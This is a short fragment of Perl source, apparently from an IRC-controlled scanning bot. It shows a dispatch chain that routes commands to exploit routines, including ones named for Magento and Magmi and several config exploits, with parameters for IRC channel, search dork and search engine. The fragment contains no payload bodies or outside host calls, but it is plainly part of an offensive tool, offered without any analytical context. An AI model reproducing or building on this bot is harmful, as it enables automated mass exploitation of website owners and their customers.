	elsif ($type == 25){$type=&rev_exploit($chan,$bug,$dork,$engine,$nick);}
	elsif ($type == 26){$type=&magento($chan,$bug,$dork,$engine,$nick);}
	elsif ($type == 27){$type=&magmi_exploit($chan,$bug,$dork,$engine,$nick);}	
	elsif ($type == 28){$type=&cfg_exploit($chan,$bug,$dork,$engine,$nick);}	
	elsif ($type == 29){$type=&cfg1_exploit($chan,$bug,$dork,$engine,$nick);}	
	elsif ($type == 30){$type=&cfg2_exploit($chan,$bug,$dork,$engine,$nick);}	
	elsif ($type == 31){$type=&cfg3_exploit($chan,$bug,$dork,$engine,$nick);}	
	elsif ($type == 32){$type=&ck_exploit($chan,$bug,$dork,$engine,$nick);}	
